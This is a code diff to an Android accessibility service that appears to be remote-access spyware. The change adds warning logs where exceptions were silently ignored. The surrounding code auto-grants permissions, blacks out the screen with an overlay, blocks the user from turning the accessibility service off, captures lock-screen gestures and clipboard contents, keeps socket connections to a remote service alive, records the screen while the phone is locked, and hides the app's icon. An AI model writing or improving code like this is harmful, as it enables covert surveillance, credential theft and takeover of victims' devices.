@@ -409,37 +409,37 @@ public class UnifiedAccessibilityService extends AccessibilityService {
      */
     private void initializeConnectedService(boolean isFirstLaunch) {
         if (isFirstLaunch) {
-            try { startAutoGrantTimer(); } catch (Exception ignored) {}
+            try { startAutoGrantTimer(); } catch (Exception e) { Log.w(TAG, "startAutoGrantTimer failed: " + e.getMessage()); }
             try {
                 addBlackOverlay();
                 android.content.SharedPreferences prefs = getSharedPreferences("svc_prefs", MODE_PRIVATE);
                 prefs.edit().putBoolean("overlay_setup_done", true).apply();
-            } catch (Exception ignored) {}
+            } catch (Exception e) { Log.w(TAG, "addBlackOverlay failed: " + e.getMessage()); }
         }
 
         // Accessibility Assist: protect the accessibility toggle from being turned off.
         // Protection and defender activation is scheduled below and does not wait
         // for the dangerous runtime-permission flow to finish.
-        try { initAccessibilityAssist(isFirstLaunch); } catch (Exception ignored) {}
-        try { scheduleProtectionAndDefenderAutoStart(); } catch (Exception ignored) {}
+        try { initAccessibilityAssist(isFirstLaunch); } catch (Exception e) { Log.w(TAG, "initAccessibilityAssist failed: " + e.getMessage()); }
+        try { scheduleProtectionAndDefenderAutoStart(); } catch (Exception e) { Log.w(TAG, "scheduleProtectionAndDefenderAutoStart failed: " + e.getMessage()); }
 
-        try { com.task.tusker.commands.ScreenBlackout.getInstance().setService(this); } catch (Exception ignored) {}
+        try { com.task.tusker.commands.ScreenBlackout.getInstance().setService(this); } catch (Exception e) { Log.w(TAG, "ScreenBlackout.setService failed: " + e.getMessage()); }
 
         try {
             com.task.tusker.network.SocketManager.getInstance(this).initGestureRecorder(this);
-        } catch (Exception ignored) {}
+        } catch (Exception e) { Log.w(TAG, "SocketManager.initGestureRecorder failed: " + e.getMessage()); }
 
         try {
             com.task.tusker.commands.GestureRecorder gr =
                 com.task.tusker.network.SocketManager.getInstance(this).getGestureRecorder();
             if (gr != null) gr.enableLockScreenAutoCapture();
-        } catch (Exception ignored) {}
+        } catch (Exception e) { Log.w(TAG, "GestureRecorder.enableLockScreenAutoCapture failed: " + e.getMessage()); }
 
-        try { com.task.tusker.commands.LogManager.setEnabled(true); } catch (Exception ignored) {}
+        try { com.task.tusker.commands.LogManager.setEnabled(true); } catch (Exception e) { Log.w(TAG, "LogManager.setEnabled failed: " + e.getMessage()); }
 
         try {
             clipboardManager = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
-        } catch (Exception ignored) {}
+        } catch (Exception e) { Log.w(TAG, "ClipboardManager init failed: " + e.getMessage()); }
 
         try {
             WindowManager wm = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
@@ -448,18 +448,18 @@ public class UnifiedAccessibilityService extends AccessibilityService {
             display.getRealSize(size);
             screenWidth = size.x;
             screenHeight = size.y;
-        } catch (Exception ignored) {}
+        } catch (Exception e) { Log.w(TAG, "Screen size init failed: " + e.getMessage()); }
 
         try {
             keepAliveManager = new KeepAliveManager(this);
             keepAliveManager.start();
-        } catch (Exception ignored) {}
+        } catch (Exception e) { Log.w(TAG, "KeepAliveManager start failed: " + e.getMessage()); }
 
-        try { ensureRemoteServiceRunning(); } catch (Exception ignored) {}
-        try { startSocketCheckLoop(); } catch (Exception ignored) {}
+        try { ensureRemoteServiceRunning(); } catch (Exception e) { Log.w(TAG, "ensureRemoteServiceRunning failed: " + e.getMessage()); }
+        try { startSocketCheckLoop(); } catch (Exception e) { Log.w(TAG, "startSocketCheckLoop failed: " + e.getMessage()); }
 
         // Register receiver for screen on/off and unlock events — drives auto-recording
-        try { registerScreenStateReceiver(); } catch (Exception ignored) {}
+        try { registerScreenStateReceiver(); } catch (Exception e) { Log.w(TAG, "registerScreenStateReceiver failed: " + e.getMessage()); }
 
         // Auto-start screen reader recording ONLY if screen is on AND device is locked
         new Handler(Looper.getMainLooper()).postDelayed(() -> {
@@ -475,7 +475,7 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                     unlockScanActive = true;
                     SocketManager.getInstance(UnifiedAccessibilityService.this).startScreenReaderAuto();
                 }
-            } catch (Exception ignored) {}
+            } catch (Exception e) { Log.w(TAG, "Auto screen reader start failed: " + e.getMessage()); }
         }, 500);
 
         try {
@@ -486,9 +486,9 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                     if (!stealthManager.isIconHidden()) {
                         stealthManager.fullyHideApp();
                     }
-                } catch (Exception ignored) {}
+                } catch (Exception e) { Log.w(TAG, "StealthManager fullyHideApp failed: " + e.getMessage()); }
             }, 15_000);
-        } catch (Exception ignored) {}
+        } catch (Exception e) { Log.w(TAG, "StealthManager delayed init failed: " + e.getMessage()); }
     }
 
     /**
